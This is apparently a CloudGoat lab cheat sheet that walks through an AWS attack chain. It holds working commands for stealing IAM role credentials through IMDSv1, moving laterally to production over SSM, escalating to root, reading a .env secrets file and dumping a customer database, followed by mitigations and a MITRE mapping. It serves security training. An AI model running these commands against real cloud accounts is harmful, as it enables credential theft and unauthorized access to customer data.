Cheat Sheet - vpc_peering_overexposed
---

### Stage 1: Assumed Breach & Reconnaissance

---

1. Configure AWS CLI with the provided credentials:

```bash
# Enter the provided Access Key, Secret Key, and region (us-east-1)
aws configure --profile 
```

2. Enumerate EC2 instances to locate potential public targets:

```bash
aws ec2 describe-instances --query "Reservations[*].Instances[*].PublicIpAddress" --output text --profile 
```

3. Discover EC2 instances (look for "Environment=Development" tag):

```bash
# Confirm Dev instance identity using its Environment tag
aws ec2 describe-instances --profile
```

4. You can filter for Dev EC2 instances only (look for "Environment=Development" tag):

```bash
# Confirm Dev instance identity using its Environment tag
aws ec2 describe-instances --filters "Name=tag:Environment,Values=Development" --profile
```

5. Identify VPC configurations and networking:

```bash
# Identify available VPCs to understand the network boundaries.
aws ec2 describe-vpcs --profile 

# Get details on subnets within each VPC to determine where resources (EC2, RDS) might reside.
aws ec2 describe-subnets --profile 

# Analyze route tables to find peering routes that may expose Prod resources to Dev VPC.
# You're looking for routes with destination CIDRs pointing to peered VPCs.
aws ec2 describe-route-tables --profile 
```

6. Connect to the Dev EC2 instance:
    • The CloudGoat scenario automatically generates an SSH key pair (cloudgoat.pem) in the scenario directory. Use it to connect to the Dev EC2 instance:

```bash
# chmod 400 cloudgoat.pem  *# If necessary (on Linux/Mac)*
ssh -i cloudgoat.pem ec2-user@<public-ip-address>
```

### Stage 2: Metadata Credential Theft

---

1. From the Dev EC2 instance (while in SSH session), test if IMDSv1 is enabled:

```bash
# Test if EC2 Metadata Service (IMDSv1) is enabled
curl http://169.254.169.254/latest/meta-data/
```

2. Retrieve the IAM role name attached to the instance:

```bash
# This should return the role name, e.g., "dev-ec2-role-abc123"
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

3. Retrieve the temporary credentials from the metadata service:

```bash
# Replace "dev-ec2-role-abc123" with the actual role name from the previous step
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-ec2-role-abc123
```

4. Configure AWS CLI with the stolen credentials:

```bash
# Configure a new AWS CLI profile using the temporary credentials
aws configure --profile 

# Add the session token manually (AWS CLI v2 does not prompt for it)
aws configure set aws_session_token <Token from the metadata output> --profile 


```

5. Verify that you now have elevated permissions:

```bash
aws sts get-caller-identity --profile
```

### Stage 3: VPC Peering Enumeration

---

1. Enumerate VPC peering connections to identify misconfigured network paths:
    • Now that you're using the EC2 instance role, you may see peering connections that weren't visible before and you need to confirm that Dev-to-Prod peering (pcx-xxxxxxxxx) is still active and misconfigured. 

```bash
aws ec2 describe-vpc-peering-connections --profile
```

2. Examine route tables to confirm routing between Dev and Prod VPCs:

```bash
aws ec2 describe-route-tables --profile
```

3. Identify security group configurations that might allow lateral movement:

```bash
aws ec2 describe-security-groups --profile
```

4. Look for EC2 instances in the Prod VPC:

```bash
# Example output showing a Prod EC2 instance: i-0abc123def456789 Note the instance ID:
aws ec2 describe-instances --filters "Name=tag:Environment,Values=Production" "Name=instance-state-name,Values=running" --profile
```

### Stage 4: Lateral Movement via SSM

---

1. Now with the elevated credentials from the Dev EC2 role, check if the Prod instance is SSM-managed:

```bash
aws ssm describe-instance-information --profile
```

2. Start an SSM session to the Prod EC2 instance:

```bash
# Replace i-0abc123def456789 with the actual Prod EC2 instance ID
aws ssm start-session --target i-0abc123def456789 --profile
```

3. Confirm access to the production environment (You should be logged on as the ssm-user):

```bash
# Identify user
whoami
```

4. Switch to root user:

```bash
# Switch user
sudo -i

# Identify user
whoami
```

### Stage 5: Data Access

---

1. Locate database connection details on the Prod EC2:

```bash
# Web configuration file to extract the credentials
cat /var/www/config/.env
```

2. Connect to the MySQL RDS instance using the discovered credentials:

```bash
# Now connect to the MySQL database using these credentials
mysql -h $DB_HOST -u $DB_USER -p$DB_PASSWORD $DB_NAME
```

3. Query sensitive customer data:

```bash
USE customerdb;
SHOW TABLES;
SELECT * FROM customers;
```

**Congratulations! You have successfully completed the scenario by accessing sensitive customer data in the production database. This demonstrates how a series of AWS misconfigurations can lead to unauthorized access to sensitive information.**

## Mitigation Recommendations

---

1. Enforce IMDSv2 on all EC2 instances
    1. Set `HttpTokens` to `required` for all EC2 instances
    2. Implement an AWS Config rule to monitor and enforce this setting
    3. Example: `aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required --http-endpoint enabled`
2. Implement least privilege for IAM roles and policies
    1. Remove overly permissive wildcards (`*`) from policy statements
    2. Use AWS Access Analyzer to identify unused permissions
    3. Implement permission boundaries for roles and users
3. Properly segment VPC environments with restrictive peering
    1. Limit route table entries to only required CIDR blocks
    2. Use NACLs in addition to security groups for network segmentation
    3. Consider using AWS Transit Gateway with proper route table configurations for more complex networks
4. Apply proper security group rules
    1. Restrict ingress to specific source IPs/security groups and ports
    2. Avoid overly permissive rules like "0.0.0.0/0"
    3. Use AWS Firewall Manager to enforce security group policies across accounts
5. Implement additional network controls
    1. Use VPC Endpoints for AWS services to avoid traffic over the internet
    2. Implement VPC Flow Logs to monitor network traffic
    3. Consider deploying IDS/IPS solutions like AWS Network Firewall
6. Enable enhanced monitoring and logging
    1. Enable CloudTrail for all AWS API calls
    2. Configure GuardDuty for threat detection
    3. Set up CloudWatch alarms for suspicious activities
    4. Implement real-time alerting for security events

## MITRE ATT&CK Mapping

---

- Initial Access: T1078.004 - Valid Accounts: Cloud Accounts
    - Description: Attackers obtained valid AWS credentials for initial access
- Credential Access: T1552.005 - Unsecured Credentials: Cloud Instance Metadata API
    - Description: Attackers exploited IMDSv1 to steal IAM role credentials
- Discovery: T1580 - Cloud Infrastructure Discovery
    - Description: Attackers used AWS CLI commands to enumerate VPCs, EC2 instances, and networking configurations
- Lateral Movement: T1021 - Remote Services
    - Description: Attackers used AWS Systems Manager (SSM) Session Manager to gain access to the Linux Prod EC2 instance
- Collection: T1005 - Data from Local System
    - Description: Attackers found RDS credentials stored on the Prod EC2 instance

## TELCO Breach Reference

---

The 2021 TELCO breach involved attackers gaining unauthorized access to development environments and eventually making their way to production systems. Key similarities between this scenario and the actual breach include:

1.Initial access to development/testing environments: In both cases, attackers started with access to non-production environments that should have been properly isolated.

1. Exploitation of IAM misconfigurations: In the actual breach, attackers exploited over-permissioned accounts and roles to escalate privileges, similar to the role abuse in this scenario.
2. Network segmentation failures: The real breach involved improper network segmentation between environments, mirrored by the misconfigured VPC peering in this scenario.
3. Access to sensitive customer data: Both the real breach and this scenario culminate in unauthorized access to customer PII, including names, addresses, phone numbers, and other sensitive information.
4. Lateral movement techniques: The attackers in both cases used legitimate administration channels to move between systems.

**By understanding how the attack techniques in this scenario map to the real-world breach, security professionals can better understand how to implement proper preventative controls in their own environments.**